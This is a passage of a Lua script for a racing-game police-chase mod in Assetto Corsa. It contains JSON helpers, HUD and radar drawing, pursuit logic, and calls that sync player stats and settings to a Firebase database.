  local kind = kind_of(obj)  -- This is 'array' if it's an array or type(obj) otherwise.
  if kind == 'array' then
    if as_key then error('Can\'t encode array as key.') end
    s[#s + 1] = '['
    for i, val in ipairs(obj) do
      if i > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(val)
    end
    s[#s + 1] = ']'
  elseif kind == 'table' then
    if as_key then error('Can\'t encode table as key.') end
    s[#s + 1] = '{'
    for k, v in pairs(obj) do
      if #s > 1 then s[#s + 1] = ', ' end
      s[#s + 1] = json.stringify(k, true)
      s[#s + 1] = ':'
      s[#s + 1] = json.stringify(v)
    end
    s[#s + 1] = '}'
  elseif kind == 'string' then
    return '""' .. escape_str(obj) .. '""'
  elseif kind == 'number' then
    if as_key then return '""' .. tostring(obj) .. '""' end
    return tostring(obj)
  elseif kind == 'boolean' then
    return tostring(obj)
  elseif kind == 'nil' then
    return 'null'
  else
    error('Unjsonifiable type: ' .. kind .. '.')
  end
  return table.concat(s)
end

json.null = {}  -- This is a one-off table to represent the null value.

function json.parse(str, pos, end_delim)
  pos = pos or 1
  if pos > #str then error('Reached unexpected end of input.') end
  local pos = pos + #str:match('^%s*', pos)  -- Skip whitespace.
  local first = str:sub(pos, pos)
  if first == '{' then  -- Parse an object.
    local obj, key, delim_found = {}, true, true
    pos = pos + 1
    while true do
      key, pos = json.parse(str, pos, '}')
      if key == nil then return obj, pos end
      if not delim_found then error('Comma missing between object items.') end
      pos = skip_delim(str, pos, ':', true)  -- true -> error if missing.
      obj[key], pos = json.parse(str, pos)
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '[' then  -- Parse an array.
    local arr, val, delim_found = {}, true, true
    pos = pos + 1
    while true do
      val, pos = json.parse(str, pos, ']')
      if val == nil then return arr, pos end
      if not delim_found then error('Comma missing between array items.') end
      arr[#arr + 1] = val
      pos, delim_found = skip_delim(str, pos, ',')
    end
  elseif first == '""' then  -- Parse a string.
    return parse_str_val(str, pos + 1)
  elseif first == '-' or first:match('%d') then  -- Parse a number.
    return parse_num_val(str, pos)
  elseif first == end_delim then  -- End of an object or array.
    return nil, pos + 1
  else  -- Parse true, false, or null.
    local literals = {['true'] = true, ['false'] = false, ['null'] = json.null}
    for lit_str, lit_val in pairs(literals) do
      local lit_end = pos + #lit_str - 1
      if str:sub(pos, lit_end) == lit_str then return lit_val, lit_end + 1 end
    end
    local pos_info_str = 'position ' .. pos .. ': ' .. str:sub(pos, pos + 10)
    error('Invalid json syntax starting at ' .. pos_info_str)
  end
end

--return json of playerData with only the data needed for the leaderboard
-- data are keys of the playerData table
local function dataStringify(data)
    local str = '{""' .. ac.getUserSteamID() .. '"": '
    local name = ac.getDriverName(0)
    data['Name'] = name
    str = str .. json.stringify(data) .. '}'
    return str
end


------------------------------------------------------------------------- Web Utils -------------------------------------------------------------------------

local settings = {
    essentialSize = 20,
    policeSize = 20,
    hudOffsetX = 0,
    hudOffsetY = 0,
    fontSize = 20,
    current = 1,
    colorHud = rgbm(1,0,0,1),
    timeMsg = 10,
    msgOffsetY = 10,
    msgOffsetX = windowWidth/2,
    fontSizeMSG = 30,
    menuPos = vec2(0, 0),
    unit = ""km/h"",
    unitMult = 1,
    starsSize = 20,
    starsPos = vec2(windowWidth, 0),
}

local settingsJSON = {
    essentialSize = 20,
    policeSize = 20,
    hudOffsetX = 0,
    hudOffsetY = 0,
    fontSize = 20,
    current = 1,
    colorHud = ""1,0,0,1"",
    timeMsg = 10,
    msgOffsetY = 10,
    msgOffsetX = ""1280"",
    fontSizeMSG = 30,
    menuPos = vec2(0, 0),
    unit = ""km/h"",
    unitMult = 1,
    starsSize = 20,
    starsPos = vec2(windowWidth, 0),
}


local function stringToVec2(str)
    if str == nil then return vec2(0, 0) end
    local x = string.match(str, ""([^,]+)"")
    local y = string.match(str, ""[^,]+,(.+)"")
    return vec2(tonumber(x), tonumber(y))
end

local function vec2ToString(vec)
    return tostring(vec.x) .. ',' .. tostring(vec.y)
end

local function stringToRGBM(str)
    local r = string.match(str, ""([^,]+)"")
    local g = string.match(str, ""[^,]+,([^,]+)"")
    local b = string.match(str, ""[^,]+,[^,]+,([^,]+)"")
    local m = string.match(str, ""[^,]+,[^,]+,[^,]+,(.+)"")
    return rgbm(tonumber(r), tonumber(g), tonumber(b), tonumber(m))
end

local function rgbmToString(rgbm)
    return tostring(rgbm.r) .. ',' .. tostring(rgbm.g) .. ',' .. tostring(rgbm.b) .. ',' .. tostring(rgbm.mult)
end

local function parsesettings(table)
    settings.essentialSize = table.essentialSize
    settings.policeSize = table.policeSize
    settings.hudOffsetX = table.hudOffsetX
    settings.hudOffsetY = table.hudOffsetY
    settings.fontSize = table.fontSize
    settings.current = table.current
    settings.colorHud = stringToRGBM(table.colorHud)
    settings.timeMsg = table.timeMsg
    settings.msgOffsetY = table.msgOffsetY
    settings.msgOffsetX = table.msgOffsetX
    settings.fontSizeMSG = table.fontSizeMSG
    settings.menuPos = stringToVec2(table.menuPos)
    settings.unit = table.unit
    settings.unitMult = table.unitMult
    settings.starsSize = table.starsSize or 20
    if table.starsPos == nil then
        settings.starsPos = vec2(windowWidth, 0)
    else
        settings.starsPos = stringToVec2(table.starsPos)
    end
end


ui.setAsynchronousImagesLoading(true)
local imageSize = vec2(0,0)

local hudImg = {
    base = ""https://i.ibb.co/8N4mNj6/zhud.png"",
    arrest = ""https://i.postimg.cc/DwJv2YgM/icon-Arrest.png"",
    cams = ""https://i.postimg.cc/15zRdzNP/iconCams.png"",
    logs = ""https://i.postimg.cc/VNXztr29/iconLogs.png"",
    lost = ""https://i.postimg.cc/DyYf3KqG/iconLost.png"",
    menu = ""https://i.postimg.cc/SxByj71N/iconMenu.png"",
    radar = ""https://i.postimg.cc/4dZsQ4TD/icon-Radar.png"",
}

local cameras = {
    {
        name = ""BOBs SCRAPYARD"",
        pos = vec3(-3564, 31.5, -103),
        dir = -8,
        fov = 60,
    },
    {
        name = ""ARENA"",
        pos = vec3(-2283, 115.5, 3284),
        dir = 128,
        fov = 70,
    },
    {
        name = ""BANK"",
        pos = vec3(-716, 151, 3556.4),
        dir = 12,
        fov = 95,
    },
    {
        name = ""STREET RUNNERS"",
        pos = vec3(-57.3, 103.5, 2935.5),
        dir = 16,
        fov = 67,
    },
    {
        name = ""ROAD CRIMINALS"",
        pos = vec3(-2332, 101.1, 3119.2),
        dir = 121,
        fov = 60,
    },
    {
        name = ""RECKLESS RENEGADES"",
        pos = vec3(-2993.7, -24.4, -601.7),
        dir = -64,
        fov = 60,
    },
    {
        name = ""MOTION MASTERS"",
        pos = vec3(-2120.4, -11.8, -1911.5),
        dir = 102,
        fov = 60,
    },
}

local pursuit = {
    suspect = nil,
    enable = false,
    maxDistance = 250000,
    minDistance = 40000,
    nextMessage = 30,
    level = 1,
    id = -1,
    timerArrest = 0,
    hasArrested = false,
    startedTime = 0,
    timeLostSight = 0,
    lostSight = false,
    engage = false,
}

local arrestations = {}

local textSize = {}

local textPos = {}

local iconPos = {}

local playerData = {}

---------------------------------------------------------------------------------------------- Firebase ----------------------------------------------------------------------------------------------

local urlAppScript = 'https://script.google.com/macros/s/AKfycbwenxjCAbfJA-S90VlV0y7mEH75qt3TuqAmVvlGkx-Y1TX8z5gHtvf5Vb8bOVNOA_9j/exec'
local firebaseUrl = 'https://acp-server-97674-default-rtdb.firebaseio.com/'
local firebaseUrlData = 'https://acp-server-97674-default-rtdb.firebaseio.com/PlayersData/'
local firebaseUrlsettings = 'https://acp-server-97674-default-rtdb.firebaseio.com/Settings'

local function updateSheets()
    local str = '{""category"" : ""Arrestations""}'
    web.post(urlAppScript, str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
        end
    end)
end

local function addPlayerToDataBase()
    local steamID = ac.getUserSteamID()
    local name = ac.getDriverName(0)
    local str = '{""' .. steamID .. '"": {""Name"":""' .. name .. '"",""Getaway"": 0,""Drift"": 0,""Overtake"": 0,""Wins"": 0,""Losses"": 0,""Busted"": 0,""Arrests"": 0,""Theft"": 0}}'
    web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function getFirebase()
    local url = firebaseUrl .. ""Players/"" .. ac.getUserSteamID() .. '.json'
    web.get(url, function(err, response)
        if err then
            print(err)
            return
        else
            if response.body == 'null' then
                addPlayerToDataBase(ac.getUserSteamID())
            else
                local jString = response.body
                playerData = json.parse(jString)
                if playerData.Name ~= ac.getDriverName(0) then
                    playerData.Name = ac.getDriverName(0)
                end
            end
            ac.log('Player data loaded')
        end
    end)
end

local function updatefirebase()
    local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(playerData) .. '}'
    web.request('PATCH', firebaseUrl .. ""Players.json"", str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
        end
    end)
end

local function updatefirebaseData(node, data)
    local str = dataStringify(data)
    web.request('PATCH', firebaseUrlData .. node .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        else
            print(response.body)
            updateSheets()
        end
    end)
end

local function addPlayersettingsToDataBase(steamID)
    local str = '{""' .. steamID .. '"": {""essentialSize"":20,""policeSize"":20,""hudOffsetX"":0,""hudOffsetY"":0,""fontSize"":20,""current"":1,""colorHud"":""1,0,0,1"",""timeMsg"":10,""msgOffsetY"":10,""msgOffsetX"":' .. windowWidth/2 .. ',""fontSizeMSG"":30,""menuPos"":""0,0"",""unit"":""km/h"",""unitMult"":1}}'
    web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function loadsettings()
    local url = firebaseUrlsettings .. ""/"" .. ac.getUserSteamID() .. '.json'
    web.get(url, function(err, response)
        if err then
            print(err)
            return
        else
            if response.body == 'null' then
                addPlayersettingsToDataBase(ac.getUserSteamID())
            else
                ac.log(""settings loaded"")
                local jString = response.body
                local table = json.parse(jString)
                parsesettings(table)
            end
        end
    end)
end

local function updatesettings()
    local str = '{""' .. ac.getUserSteamID() .. '"": ' .. json.stringify(settingsJSON) .. '}'
    web.request('PATCH', firebaseUrlsettings .. "".json"", str, function(err, response)
        if err then
            print(err)
            return
        end
    end)
end

local function onsettingsChange()
    settingsJSON.colorHud = rgbmToString(settings.colorHud)
    settingsJSON.menuPos = vec2ToString(settings.menuPos)
    settingsJSON.essentialSize = settings.essentialSize
    settingsJSON.policeSize = settings.policeSize
    settingsJSON.hudOffsetX = settings.hudOffsetX
    settingsJSON.hudOffsetY = settings.hudOffsetY
    settingsJSON.fontSize = settings.fontSize
    settingsJSON.current = settings.current
    settingsJSON.timeMsg = settings.timeMsg
    settingsJSON.msgOffsetY  = settings.msgOffsetY
    settingsJSON.msgOffsetX  = settings.msgOffsetX
    settingsJSON.fontSizeMSG = settings.fontSizeMSG
    settingsJSON.unit = settings.unit
    settingsJSON.unitMult = settings.unitMult
    settingsJSON.starsSize = settings.starsSize
    settingsJSON.starsPos = vec2ToString(settings.starsPos)
    updatesettings()
end

---------------------------------------------------------------------------------------------- settings ----------------------------------------------------------------------------------------------

local acpPolice = ac.OnlineEvent({
    message = ac.StructItem.string(110),
    messageType = ac.StructItem.int16(),
    yourIndex = ac.StructItem.int16(),
}, function (sender, data)
    if data.yourIndex == car.sessionID and data.messageType == 0 and pursuit.suspect ~= nil and sender == pursuit.suspect then
        pursuit.hasArrested = true
        ac.log(""ZHD Police: Police received"")
    end
end)

local starsUI = {
    starsPos = vec2(windowWidth - (settings.starsSize or 20)/2, settings.starsSize or 20)/2,
    starsSize = vec2(windowWidth - (settings.starsSize or 20)*2, (settings.starsSize or 20)*2),
    startSpace = (settings.starsSize or 20)/4,
}

local function resetStarsUI()
    if settings.starsPos == nil then
        settings.starsPos = vec2(windowWidth, 0)
    end
    if settings.starsSize == nil then
        settings.starsSize = 20
    end
    starsUI.starsPos = vec2(settings.starsPos.x - settings.starsSize/2, settings.starsPos.y + settings.starsSize/2)
    starsUI.starsSize = vec2(settings.starsPos.x - settings.starsSize*2, settings.starsPos.y + settings.starsSize*2)
    starsUI.startSpace = settings.starsSize/1.5
end

local function updatePos()
    imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
    iconPos.arrest1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/3.2)
    iconPos.arrest2 = vec2(imageSize.x/1.215, imageSize.y/5)
    iconPos.lost1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/2.35)
    iconPos.lost2 = vec2(imageSize.x/1.215, imageSize.y/3.2)
    iconPos.logs1 = vec2(imageSize.x/1.215, imageSize.y/1.88)
    iconPos.logs2 = vec2(imageSize.x/1.39, imageSize.y/2.35)
    iconPos.menu1 = vec2(imageSize.x - imageSize.x/12, imageSize.y/1.88)
    iconPos.menu2 = vec2(imageSize.x/1.215, imageSize.y/2.35)
    iconPos.cams1 = vec2(imageSize.x/1.215, imageSize.y/2.35)
    iconPos.cams2 = vec2(imageSize.x/1.39, imageSize.y/3.2)

    textSize.size = vec2(imageSize.x*3/5, settings.fontSize/2)
    textSize.box = vec2(imageSize.x*3/5, settings.fontSize/1.3)
    textSize.window1 = vec2(settings.hudOffsetX+imageSize.x/9.5, settings.hudOffsetY+imageSize.y/5.3)
    textSize.window2 = vec2(imageSize.x*3/5, imageSize.y/2.8)

    textPos.box1 = vec2(0, 0)
    textPos.box2 = vec2(textSize.size.x, textSize.size.y*1.8)
    textPos.addBox = vec2(0, textSize.size.y*1.8)
    settings.fontSize = settings.policeSize * fontMultiplier

    resetStarsUI()
end

local function showStarsPursuit()
    local starsColor = rgbm(1, 1, 1, os.clock()%2 + 0.3)
    resetStarsUI()
    for i = 1, 5 do
        if i > pursuit.level/2 then
            ui.drawIcon(ui.Icons.StarEmpty, starsUI.starsPos, starsUI.starsSize, rgbm(1, 1, 1, 0.2))
        else
            ui.drawIcon(ui.Icons.StarFull, starsUI.starsPos, starsUI.starsSize, starsColor)
        end
        starsUI.starsPos.x = starsUI.starsPos.x - settings.starsSize - starsUI.startSpace
        starsUI.starsSize.x = starsUI.starsSize.x - settings.starsSize - starsUI.startSpace
    end
end

local showPreviewMsg = false
local showPreviewStars = false
COLORSMSGBG = rgbm(0.5,0.5,0.5,0.5)

local function initsettings()
    if settings.unit then
        settings.fontSize = settings.policeSize * fontMultiplier
        if settings.unit ~= ""km/h"" then settings.unitMult = 0.621371 end
        settings.policeSize = settings.policeSize * windowHeight/1440
        settings.fontSize = settings.policeSize * windowHeight/1440
        imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
        updatePos()
    end
end

local function previewMSG()
    ui.beginTransparentWindow(""previewMSG"", vec2(0, 0), vec2(windowWidth, windowHeight))
    ui.pushDWriteFont(""Orbitron;Weight=800"")
    local tSize = ui.measureDWriteText(""Messages from Police when being chased"", settings.fontSizeMSG)
    local uiOffsetX = settings.msgOffsetX - tSize.x/2
    local uiOffsetY = settings.msgOffsetY
    ui.drawRectFilled(vec2(uiOffsetX - 5, uiOffsetY-5), vec2(uiOffsetX + tSize.x + 5, uiOffsetY + tSize.y + 5), COLORSMSGBG)
    ui.dwriteDrawText(""Messages from Police when being chased"", settings.fontSizeMSG, vec2(uiOffsetX, uiOffsetY), rgbm.colors.cyan)
    ui.popDWriteFont()
    ui.endTransparentWindow()
end

local function previewStars()
    ui.beginTransparentWindow(""previewStars"", vec2(0, 0), vec2(windowWidth, windowHeight))
    showStarsPursuit()
    ui.endTransparentWindow()
end

local function uiTab()
    ui.text('On Screen Message : ')
    settings.timeMsg = ui.slider('##' .. 'Time Msg On Screen', settings.timeMsg, 1, 15, 'Time Msg On Screen' .. ': %.0fs')
    settings.fontSizeMSG = ui.slider('##' .. 'Font Size MSG', settings.fontSizeMSG, 10, 50, 'Font Size' .. ': %.0f')
    ui.text('Stars : ')
    settings.starsPos.x = ui.slider('##' .. 'Stars Offset X', settings.starsPos.x, 0, windowWidth, 'Stars Offset X' .. ': %.0f')
    settings.starsPos.y = ui.slider('##' .. 'Stars Offset Y', settings.starsPos.y, 0, windowHeight, 'Stars Offset Y' .. ': %.0f')
    settings.starsSize = ui.slider('##' .. 'Stars Size', settings.starsSize, 10, 50, 'Stars Size' .. ': %.0f')
    ui.newLine()
    ui.text('Offset : ')
    settings.msgOffsetY = ui.slider('##' .. 'Msg On Screen Offset Y', settings.msgOffsetY, 0, windowHeight, 'Msg On Screen Offset Y' .. ': %.0f')
    settings.msgOffsetX = ui.slider('##' .. 'Msg On Screen Offset X', settings.msgOffsetX, 0, windowWidth, 'Msg On Screen Offset X' .. ': %.0f')
    ui.newLine()
    ui.text('Preview : ')
    ui.sameLine()
    if ui.button('Message') then
        showPreviewMsg = not showPreviewMsg
        showPreviewStars = false
    end
    ui.sameLine()
    if ui.button('Stars') then
        showPreviewStars = not showPreviewStars
        showPreviewMsg = false
    end
    if showPreviewMsg then previewMSG()
    elseif showPreviewStars then previewStars() end
    if ui.button('Offset X to center') then settings.msgOffsetX = windowWidth/2 end
    ui.newLine()
end

local function settingsWindow()
    imageSize = vec2(windowHeight/80 * settings.policeSize, windowHeight/80 * settings.policeSize)
    ui.dwriteTextAligned(""settings"", 40, ui.Alignment.Center, ui.Alignment.Center, vec2(windowWidth/6.5,60), false, rgbm.colors.white)
    ui.drawLine(vec2(0,60), vec2(windowWidth/6.5,60), rgbm.colors.white, 1)
    ui.newLine(20)
    ui.sameLine(10)
    ui.beginGroup()
    ui.text('Unit : ')
    ui.sameLine(160)
    if ui.selectable('mph', settings.unit == 'mph',_, ui.measureText('km/h')) then
        settings.unit = 'mph'
        settings.unitMult = 0.621371
    end
    ui.sameLine(200)
    if ui.selectable('km/h', settings.unit == 'km/h',_, ui.measureText('km/h')) then
        settings.unit = 'km/h'
        settings.unitMult = 1
    end
    ui.sameLine(windowWidth/6.5 - 120)
    if ui.button('Close', vec2(100, windowHeight/50)) then
        settingsOpen = false
        onsettingsChange()
    end
    ui.text('HUD : ')
    settings.hudOffsetX = ui.slider('##' .. 'HUD Offset X', settings.hudOffsetX, 0, windowWidth, 'HUD Offset X' .. ': %.0f')
    settings.hudOffsetY = ui.slider('##' .. 'HUD Offset Y', settings.hudOffsetY, 0, windowHeight, 'HUD Offset Y' .. ': %.0f')
    settings.policeSize = ui.slider('##' .. 'HUD Size', settings.policeSize, 10, 50, 'HUD Size' .. ': %.0f')
    settings.fontSize = settings.policeSize * fontMultiplier
    ui.setNextItemWidth(300)
    ui.newLine()
    uiTab()
    updatePos()
    ui.endGroup()
end

---------------------------------------------------------------------------------------------- Utils ----------------------------------------------------------------------------------------------

local function formatMessage(message)
    local msgToSend = message
    if pursuit.suspect == nil then
        msgToSend = string.gsub(msgToSend,""`CAR`"", ""No Car"")
        msgToSend = string.gsub(msgToSend,""`NAME`"", ""No Name"")
        msgToSend = string.gsub(msgToSend,""`SPEED`"", ""No Speed"")
        return msgToSend
    end
    msgToSend = string.gsub(msgToSend,""`CAR`"", string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """"))
    msgToSend = string.gsub(msgToSend,""`NAME`"", ""@"" .. ac.getDriverName(pursuit.suspect.index))
    msgToSend = string.gsub(msgToSend,""`SPEED`"", string.format(""%d "", ac.getCarSpeedKmh(pursuit.suspect.index) * settings.unitMult) .. settings.unit)
    return msgToSend
end

---------------------------------------------------------------------------------------------- HUD ----------------------------------------------------------------------------------------------

local policeLightsPos = {
    vec2(0,0),
    vec2(windowWidth/10,windowHeight),
    vec2(windowWidth-windowWidth/10,0),
    vec2(windowWidth,windowHeight)
}

local function showPoliceLights()
    local timing = math.floor(os.clock()*2 % 2)
    if timing == 0 then
        ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(1,0,0,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(1,0,0,0.5))
        ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(0,0,1,0.5), rgbm(0,0,1,0.5), rgbm(0,0,0,0))
    else
        ui.drawRectFilledMultiColor(policeLightsPos[1], policeLightsPos[2], rgbm(0,0,1,0.5), rgbm(0,0,0,0), rgbm(0,0,0,0), rgbm(0,0,1,0.5))
        ui.drawRectFilledMultiColor(policeLightsPos[3], policeLightsPos[4], rgbm(0,0,0,0), rgbm(1,0,0,0.5), rgbm(1,0,0,0.5), rgbm(0,0,0,0))
    end
end

local chaseLVL = {
    message = """",
    messageTimer = 0,
    color = rgbm(1,1,1,1),
}

local function resetChase()
    pursuit.enable = false
    pursuit.nextMessage = 30
    pursuit.lostSight = false
    pursuit.timeLostSight = 2
end

local function lostSuspect()
    resetChase()
    pursuit.lostSight = false
    pursuit.timeLostSight = 0
    pursuit.level = 1
    ac.sendChatMessage(formatMessage(msgLost.msg[math.random(#msgLost.msg)]))
    pursuit.suspect = nil
    if cspAboveP218 then
        ac.setExtraSwitch(0, false)
    end
end

local iconsColorOn = {
    [1] = rgbm(1,0,0,1),
    [2] = rgbm(1,1,1,1),
    [3] = rgbm(1,1,1,1),
    [4] = rgbm(1,1,1,1),
    [5] = rgbm(1,1,1,1),
    [6] = rgbm(1,1,1,1),
}

local playersInRange = {}

local function drawImage()
    iconsColorOn[2] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[3] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[4] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[5] = rgbm(0.99,0.99,0.99,1)
    iconsColorOn[6] = rgbm(0.99,0.99,0.99,1)
    local uiStats = ac.getUI()

    if ui.rectHovered(iconPos.arrest2, iconPos.arrest1) then
        iconsColorOn[2] = rgbm(1,0,0,1)
        if pursuit.suspect and pursuit.suspect.speedKmh < 50 and car.speedKmh < 20 and uiStats.isMouseLeftKeyClicked then
            pursuit.hasArrested = true
        end
    elseif ui.rectHovered(iconPos.cams2, iconPos.cams1) then
        iconsColorOn[3] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if camerasOpen then camerasOpen = false
            else
                camerasOpen = true
                arrestLogsOpen = false
                if settingsOpen then
                    onsettingsChange()
                    settingsOpen = false
                end
            end
        end
    elseif ui.rectHovered(iconPos.lost2, iconPos.lost1) then
        iconsColorOn[4] = rgbm(1,0,0,1)
        if pursuit.suspect and uiStats.isMouseLeftKeyClicked then
            lostSuspect()
        end
    elseif ui.rectHovered(iconPos.logs2, iconPos.logs1) then
        iconsColorOn[5] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if arrestLogsOpen then arrestLogsOpen = false
            else
                arrestLogsOpen = true
                camerasOpen = false
                if settingsOpen then
                    onsettingsChange()
                    settingsOpen = false
                end
            end
        end
    elseif ui.rectHovered(iconPos.menu2, iconPos.menu1) then
        iconsColorOn[6] = rgbm(1,0,0,1)
        if uiStats.isMouseLeftKeyClicked then
            if settingsOpen then
                onsettingsChange()
                settingsOpen = false
            else
                settingsOpen = true
                arrestLogsOpen = false
                camerasOpen = false
            end
        end
    end
    ui.image(hudImg.base, imageSize, rgbm.colors.white)
    ui.drawImage(hudImg.radar, vec2(0,0), imageSize, iconsColorOn[1])
    ui.drawImage(hudImg.arrest, vec2(0,0), imageSize, iconsColorOn[2])
    ui.drawImage(hudImg.cams, vec2(0,0), imageSize, iconsColorOn[3])
    ui.drawImage(hudImg.lost, vec2(0,0), imageSize, iconsColorOn[4])
    ui.drawImage(hudImg.logs, vec2(0,0), imageSize, iconsColorOn[5])
    ui.drawImage(hudImg.menu, vec2(0,0), imageSize, iconsColorOn[6])
end

local function playerSelected(player)
    if player.speedKmh > 50 then
        pursuit.suspect = player
        pursuit.nextMessage = 30
        pursuit.level = 1
        local msgToSend = ""Officer "" .. ac.getDriverName(0) .. "" is chasing you. Run! ""
        pursuit.startedTime = settings.timeMsg
        pursuit.engage = true
        acpPolice{message = msgToSend, messageType = 0, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
        if cspAboveP218 then
            ac.setExtraSwitch(0, true)
        end
    end
end

local function hudInChase()
    ui.pushDWriteFont(""Orbitron;Weight=Black"")
    ui.sameLine(20)
    ui.beginGroup()
    ui.newLine(1)
    local textPursuit = ""LVL : "" .. math.floor(pursuit.level/2)
    ui.dwriteTextWrapped(ac.getDriverName(pursuit.suspect.index) .. '\n'
                        .. string.gsub(string.gsub(ac.getCarName(pursuit.suspect.index), ""%W"", "" ""), ""  "", """")
                        .. '\n' .. string.format(""Speed: %d "", pursuit.suspect.speedKmh * settings.unitMult) .. settings.unit
                        .. '\n' .. textPursuit, settings.fontSize/2, rgbm.colors.white)
    ui.dummy(vec2(imageSize.x/5,imageSize.y/20))
    ui.newLine(30)
    ui.sameLine()
    if ui.button('Cancel Chase', vec2(imageSize.x/5, imageSize.y/20)) then
        lostSuspect()
    end
    ui.endGroup()
    ui.popDWriteFont()
end

local function drawText()
    local uiStats = ac.getUI()
    ui.pushDWriteFont(""Orbitron;Weight=Bold"")
    ui.dwriteDrawText(""RADAR ACTIVE"", settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(""RADAR ACTIVE"", settings.fontSize/2).x)/2, 0), rgbm(1,0,0,1))
    ui.popDWriteFont()
    ui.pushDWriteFont(""Orbitron;Weight=Regular"")
    ui.dwriteDrawText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3, vec2((textPos.box2.x - ui.measureDWriteText(""NEARBY VEHICULE SPEED SCANNING"", settings.fontSize/3).x)/2, settings.fontSize/1.5), rgbm(1,0,0,1))

    local colorText = rgbm(1,1,1,1)
    textPos.box1 = vec2(0, textSize.size.y*2.5)
    ui.dummy(vec2(textPos.box2.x,settings.fontSize))
    for i = 1, #playersInRange do
        colorText = rgbm(1,1,1,1)
        ui.drawRect(vec2(textPos.box2.x/9,textPos.box1.y), vec2(textPos.box2.x*8/9, textPos.box1.y + textPos.box2.y), rgbm(1,1,1,0.1), 1)
        if ui.rectHovered(textPos.box1, textPos.box1 + textPos.box2) then
            colorText = rgbm(1,0,0,1)
            if uiStats.isMouseLeftKeyClicked then
                playerSelected(playersInRange[i].player)
            end
        end
        ui.dwriteDrawText(playersInRange[i].text, settings.fontSize/2, vec2((textPos.box2.x - ui.measureDWriteText(ac.getDriverName(playersInRange[i].player.index) .. "" - 000 "" .. settings.unit, settings.fontSize/2).x)/2, textPos.box1.y + textSize.size.y/5), colorText)
        textPos.box1 = textPos.box1 + textPos.addBox
        ui.dummy(vec2(textPos.box2.x, i * settings.fontSize/5))
    end
    ui.popDWriteFont()
end

local function radarUI()
    ui.toolWindow('radarText', textSize.window1, textSize.window2, true, function ()
        ui.childWindow('childradar', textSize.window2, true , function ()
            if pursuit.suspect then hudInChase()
            else drawText() end
        end)
    end)
    ui.transparentWindow('radar', vec2(settings.hudOffsetX, settings.hudOffsetY), imageSize, true, function ()
        drawImage()
    end)
end

local function hidePlayers()
    local hideRange = 500
    for i = ac.getSim().carsCount - 1, 0, -1 do
        local player = ac.getCar(i)
        local playerCarID = ac.getCarID(i)
        if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
            if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
                if player.position.x > car.position.x - hideRange and player.position.z > car.position.z - hideRange and player.position.x < car.position.x + hideRange and player.position.z < car.position.z + hideRange then
                    ac.hideCarLabels(i, false)
                else
                    ac.hideCarLabels(i, true)
                end
            end
        end
    end
end

local function radarUpdate()
    if firstload and not pursuit.suspect then return end
    local radarRange = 250
    local previousSize = #playersInRange

    local j = 1
    for i = ac.getSim().carsCount - 1, 0, -1 do
        local player = ac.getCar(i)
        local playerCarID = ac.getCarID(i)
        if player.isConnected and ac.getCarBrand(i) ~= ""traffic"" then
            if playerCarID ~= valideCar[1] and playerCarID ~= valideCar[2] and playerCarID ~= valideCar[3] then
                if player.position.x > car.position.x - radarRange and player.position.z > car.position.z - radarRange and player.position.x < car.position.x + radarRange and player.position.z < car.position.z + radarRange then
                    playersInRange[j] = {}
                    playersInRange[j].player = player
                    playersInRange[j].text = ac.getDriverName(player.index) .. string.format("" - %d "", player.speedKmh * settings.unitMult) .. settings.unit
                    j = j + 1
                    if j == 9 then break end
                end
            end
        end
    end
    for i = j, previousSize do playersInRange[i] = nil end
end

---------------------------------------------------------------------------------------------- Chase ----------------------------------------------------------------------------------------------

local function inRange()
    local distance_x = pursuit.suspect.position.x - car.position.x
    local distance_z = pursuit.suspect.position.z - car.position.z
    local distanceSquared = distance_x * distance_x + distance_z * distance_z
    if(distanceSquared < pursuit.minDistance) then
        pursuit.enable = true
        pursuit.lostSight = false
        pursuit.timeLostSight = 2
    elseif (distanceSquared < pursuit.maxDistance) then resetChase()
    else
        if not pursuit.lostSight then
            pursuit.lostSight = true
            pursuit.timeLostSight = 2
        else
            pursuit.timeLostSight = pursuit.timeLostSight - ui.deltaTime()
            if pursuit.timeLostSight < 0 then lostSuspect() end
        end
    end
end

local function sendChatToSuspect()
    if pursuit.enable then
        if 0 < pursuit.nextMessage then
            pursuit.nextMessage = pursuit.nextMessage - ui.deltaTime()
        elseif pursuit.nextMessage < 0 then
            local nb = tostring(pursuit.level)
            acpPolice{message = nb, messageType = 1, yourIndex = ac.getCar(pursuit.suspect.index).sessionID}
            if pursuit.level < 10 then
                pursuit.level = pursuit.level + 1
                chaseLVL.messageTimer = settings.timeMsg
                chaseLVL.message = ""CHASE LEVEL "" .. math.floor(pursuit.level/2)
                if pursuit.level > 8 then
                    chaseLVL.color = rgbm.colors.red
                elseif pursuit.level > 6 then
                    chaseLVL.color = rgbm.colors.orange
                elseif pursuit.level > 4 then
                    chaseLVL.color = rgbm.colors.yellow
                else
                    chaseLVL.color = rgbm.colors.white
                end
            end
            pursuit.nextMessage = 30
        end
